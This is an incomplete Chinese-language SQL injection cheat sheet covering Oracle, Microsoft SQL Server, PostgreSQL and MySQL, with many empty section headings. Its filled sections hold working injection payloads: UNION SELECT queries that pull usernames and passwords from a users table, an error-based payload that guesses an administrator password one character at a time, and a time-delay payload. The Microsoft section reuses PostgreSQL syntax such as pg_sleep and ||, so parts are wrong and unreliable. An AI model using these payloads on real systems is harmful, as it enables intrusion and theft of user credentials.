# ✔️ SQL注入CheatSheet

## Oracle

### 字符串连接

```sql
'aaa' || 'bbb'
```

### 截取字符串

```sql
SUBSTR('asdsfsdgf', 4, 2)
```

### 用注释截断查询

```sql
--
```

### 数据库类型和版本查询

```sql
SELECT * FROM v$version
SELECT banner FROM v$version
SELECT version FROM v$instance
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM all_tables
// 列出数据库中某个表中的所有列
SELECT * FROM all_tab_columns WHERE table_name = '表名'
```

### 布尔条件错误

```sql
// Some code
```

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露





## Microsoft

### 字符串连接

```sql
'aaa' || 'bbb'
```

### 截取字符串

```sql
SUBSTRING('fcsasff', 4, 2)
```

### 用注释截断查询

```sql
--
/*    */
```

### 数据库类型和版本查询

```sql
SELECT @@version
' UNION SELECT @@version--
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM information_schema.tables
// 列出数据库中某个表中的所有列
SELECT * FROM information_schema.columns WHERE table_name = '表名'
// 实例
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
'+UNION+SELECT+username,password+FROM+users--
// 触发除零错误，一次测试一个字符来检索数据
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

### 布尔条件错误

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

```sql
// Some code
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
```

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露



## PostgreSQL

### 字符串连接

```sql
'aaa' || 'bbb'
```

### 截取字符串

```sql
SUBSTRING('sdaggrfsgrh', 4, 2)
```

### 用注释截断查询

```sql
--
/*   */
```

### 数据库类型和版本查询

```sql
SELECT version()
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM information_schema.tables
// 列出数据库中某个表中的所有列
SELECT * FROM information_schema.columns WHERE table_name = '表名'
// 实例
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
'+UNION+SELECT+username,password+FROM+users--
// 触发除零错误，一次测试一个字符来检索数据
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

### 布尔条件错误

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

```sql
// Some code
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
```

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露



## MySQL

### 字符串连接

```sql
// 字符串之间是有空格的
'aaa' 'bbb'
CONCAT('aaa','bbb')
```

### 截取字符串

```sql
SUBSTRING('afdgghtr', 4, 2)
```

### 用注释截断查询

```sql
// -- 之后有空格
#
--
/*   */
```

### 数据库类型和版本查询

```sql
SELECT @@version
' UNION SELECT @@version--
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM information_schema.tables
// 列出数据库中某个表中的所有列
SELECT * FROM information_schema.columns WHERE table_name = '表名'
// 实例
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
'+UNION+SELECT+username,password+FROM+users--
// 触发除零错误，一次测试一个字符来检索数据
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

### 布尔条件错误

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

```sql
// Some code
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
```

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露
